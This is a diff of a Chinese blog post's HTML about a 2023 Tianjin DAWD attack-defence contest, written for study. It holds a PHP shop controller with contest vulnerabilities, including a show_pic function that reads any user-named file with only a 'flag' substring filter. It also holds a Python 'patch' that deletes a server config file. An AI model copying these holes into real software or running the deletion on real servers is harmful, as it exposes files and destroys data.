invoke__">serialize</span>(<span class="variable">$user_data</span>)));</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$datas</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;cat | ASHOP&#x27;</span>;</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;catid&#x27;</span>] = <span class="variable">$catid</span>;</span><br><span class="line">		<span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$datas</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line">				<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line">				<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-1 day&#x27;</span>));</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line">				<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>, <span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-2 day&#x27;</span>));</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_contents</span>(<span class="variable">$time</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">cat_more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">		<span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line">		<span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">cat_contents</span>(<span class="variable">$catid</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">		<span class="comment">//print_r($data);</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$pic</span>, <span class="string">&quot;flag&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">			<span class="variable">$pic</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">indexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">medoo</span></span><br><span class="hljs-class"></span>&#123;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$date</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;time&#x27;</span>);<br>		<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$date</span>) &#123;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;today&#x27;</span>:<br>				<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;today&#x27;</span>;<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;yestoday&#x27;</span>:<br>				<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;yestoday&#x27;</span>;<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;before&#x27;</span>:<br>				<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;before&#x27;</span>;<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">default</span>:<br>				<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;today&#x27;</span>;<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;ASHOP&#x27;</span>;<br>		<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_cats</span>();<br><br>		<span class="hljs-variable">$user_data</span> = <span class="hljs-keyword">array</span>();<br>		<span class="hljs-variable">$user_data</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-title function_ invoke__">time</span>();<br>		<span class="hljs-variable">$user_data</span>[<span class="hljs-string">&#x27;ip&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br>		<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;AshopToken&quot;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user_data</span>)));<br><br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$datas</span>);<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cat</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$catid</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;cat | ASHOP&#x27;</span>;<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] = <span class="hljs-variable">$catid</span>;<br>		<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_cats</span>();<br><br>		<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$datas</span>);<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">more</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$date</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;time&#x27;</span>);<br>		<span class="hljs-keyword">switch</span> (<span class="hljs-variable">$date</span>) &#123;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;today&#x27;</span>:<br>				<span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>());<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;yestoday&#x27;</span>:<br>				<span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>, <span class="hljs-title function_ invoke__">strtotime</span>(<span class="hljs-string">&#x27;-1 day&#x27;</span>));<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;before&#x27;</span>:<br>				<span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>, <span class="hljs-title function_ invoke__">strtotime</span>(<span class="hljs-string">&#x27;-2 day&#x27;</span>));<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_contents</span>(<span class="hljs-variable">$time</span>);<br><br>		<span class="hljs-variable">$data</span> = <span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><br>		<span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_more</span>(<span class="hljs-variable">$data</span>);<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cat_more</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$catid</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br>		<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br>		<span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">cat_contents</span>(<span class="hljs-variable">$catid</span>);<br><br>		<span class="hljs-variable">$data</span> = <span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br>		<span class="hljs-comment">//print_r($data);</span><br><br>		<span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_more</span>(<span class="hljs-variable">$data</span>);<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_pic</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">	</span>&#123;<br>		<span class="hljs-variable">$pic</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$pic</span>, <span class="hljs-string">&quot;flag&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>			<span class="hljs-variable">$pic</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$pic</span> != <span class="hljs-literal">null</span>) &#123;<br>			<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:image/jpeg&quot;</span>);<br>			<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pic</span>);<br>		&#125;<br>	&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>patch.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;/var/www/html/config/config.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.remove(file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;file_path&#125;</span> has been successfully deleted.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Error deleting <span class="subst">&#123;file_path&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>file_path = <span class="hljs-string">&quot;/var/www/html/config/config.php&quot;</span><br><br><span class="hljs-keyword">try</span>:<br>    os.remove(file_path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;File <span class="hljs-subst">&#123;file_path&#125;</span> has been successfully deleted.&quot;</span>)<br><span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error deleting <span class="hljs-subst">&#123;file_path&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p>应急响应考察更多的是一些木马和勒索病毒的知识，模式与ctf答题模式差不多，只不过每道题给分是固定的。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次打 dawd 模式，感觉 dawd 是 awd 的简化版，没有不死马这种一次打中每次都能拿分的骚操作，更加考验大家写脚本的速度和熟练度。</p>
@@ -238,52 +408,436 @@
 <a href="/2023/09/19/2023tianjindawd/e79e25ed862e454c8118d883dfb30c3b.zip" title="pwn-ttt">pwn-ttt</a>
 
 <p>还有一道pwn题找不到了。。。</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.lazyforever.top">lazy_forever</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.lazyforever.top/2023/09/19/2023tianjindawd/">https://blog.lazyforever.top/2023/09/19/2023tianjindawd/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.lazyforever.top" target="_blank">lazy_forever's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/rce/">rce</a><a class="post-meta__tags" href="/tags/php/">php</a><a class="post-meta__tags" href="/tags/awd/">awd</a></div><div class="post_share"><div class="social-share" data-image="https://datacon.qianxin.com/api/competitions/70/logo" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechatpay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechatpay.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/26/2023newstarctfWeek1/" title="NewStarCTF 2023-WEEK1 WriteUp"><img class="cover" src="https://buuoj.cn/files/6947ee99adabc83c0b8cada398974e8f/NewStarCTF2023.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NewStarCTF 2023-WEEK1 WriteUp</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/27/2023dasctf_MyPicDisk/" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk"><img class="cover" src="https://files.buuoj.cn/files/af4ab817bcd19b8b3618173239af6c0c/11111.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/07/27/2023dasctf_MyPicDisk/" title="[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk"><img class="cover" src="https://files.buuoj.cn/files/af4ab817bcd19b8b3618173239af6c0c/11111.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-27</div><div class="title">[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lazy_forever</div><div class="author-info__description">lazy_forever's blog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lazy-forever"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lazy-forever" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/490568380" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #ff69b4;"></i></a><a class="social-icon" href="mailto:2606090126@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E5%90%8D"><span class="toc-number">2.</span> <span class="toc-text">排名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/05/2023newstarctfWeek4/" title="NewStarCTF 2023-WEEK4 Web WriteUp"><img src="https://buuoj.cn/files/6947ee99adabc83c0b8cada398974e8f/NewStarCTF2023.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStarCTF 2023-WEEK4 Web WriteUp"/></a><div class="content"><a class="title" href="/2023/11/05/2023newstarctfWeek4/" title="NewStarCTF 2023-WEEK4 Web WriteUp">NewStarCTF 2023-WEEK4 Web WriteUp</a><time datetime="2023-11-05T13:02:41.000Z" title="发表于 2023-11-05 21:02:41">2023-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/17/2023newstarctfWeek3/" title="NewStarCTF 2023-WEEK3 Web WriteUp"><img src="https://buuoj.cn/files/6947ee99adabc83c0b8cada398974e8f/NewStarCTF2023.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStarCTF 2023-WEEK3 Web WriteUp"/></a><div class="content"><a class="title" href="/2023/10/17/2023newstarctfWeek3/" title="NewStarCTF 2023-WEEK3 Web WriteUp">NewStarCTF 2023-WEEK3 Web WriteUp</a><time datetime="2023-10-17T04:55:06.000Z" title="发表于 2023-10-17 12:55:06">2023-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/10/2023newstarctfWeek2/" title="NewStarCTF 2023-WEEK2 Web WriteUp"><img src="https://buuoj.cn/files/6947ee99adabc83c0b8cada398974e8f/NewStarCTF2023.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStarCTF 2023-WEEK2 Web WriteUp"/></a><div class="content"><a class="title" href="/2023/10/10/2023newstarctfWeek2/" title="NewStarCTF 2023-WEEK2 Web WriteUp">NewStarCTF 2023-WEEK2 Web WriteUp</a><time datetime="2023-10-09T23:51:20.000Z" title="发表于 2023-10-10 07:51:20">2023-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/26/2023newstarctfWeek1/" title="NewStarCTF 2023-WEEK1 WriteUp"><img src="https://buuoj.cn/files/6947ee99adabc83c0b8cada398974e8f/NewStarCTF2023.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStarCTF 2023-WEEK1 WriteUp"/></a><div class="content"><a class="title" href="/2023/09/26/2023newstarctfWeek1/" title="NewStarCTF 2023-WEEK1 WriteUp">NewStarCTF 2023-WEEK1 WriteUp</a><time datetime="2023-09-26T05:33:13.000Z" title="发表于 2023-09-26 13:33:13">2023-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/19/2023tianjindawd/" title="天津市大学生信息安全网络攻防大赛"><img src="https://datacon.qianxin.com/api/competitions/70/logo" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="天津市大学生信息安全网络攻防大赛"/></a><div class="content"><a class="title" href="/2023/09/19/2023tianjindawd/" title="天津市大学生信息安全网络攻防大赛">天津市大学生信息安全网络攻防大赛</a><time datetime="2023-09-19T05:07:18.000Z" title="发表于 2023-09-19 13:07:18">2023-09-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 By lazy_forever</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(()=>{
-  const init = () => {
-    twikoo.init(Object.assign({
-      el: '#twikoo-wrap',
-      envId: 'https://twikoo.lazyforever.top/',
-      region: '',
-      onCommentLoaded: function () {
-        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
-      }
-    }, null))
-  }
 
-  const getCount = () => {
-    const countELement = document.getElementById('twikoo-count')
-    if(!countELement) return
-    twikoo.getCommentsCount({
-      envId: 'https://twikoo.lazyforever.top/',
-      region: '',
-      urls: [window.location.pathname],
-      includeReply: false
-    }).then(function (res) {
-      countELement.textContent = res[0].count
-    }).catch(function (err) {
-      console.error(err);
-    });
-  }
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
 
-  const runFn = () => {
-    init()
+<span class="category-chains">
+  
+  
     
-  }
+      <span class="category-chain">
+        
+  <a href="/categories/awd/" class="category-chain-item">awd</a>
+  
+  
 
-  const loadTwikoo = () => {
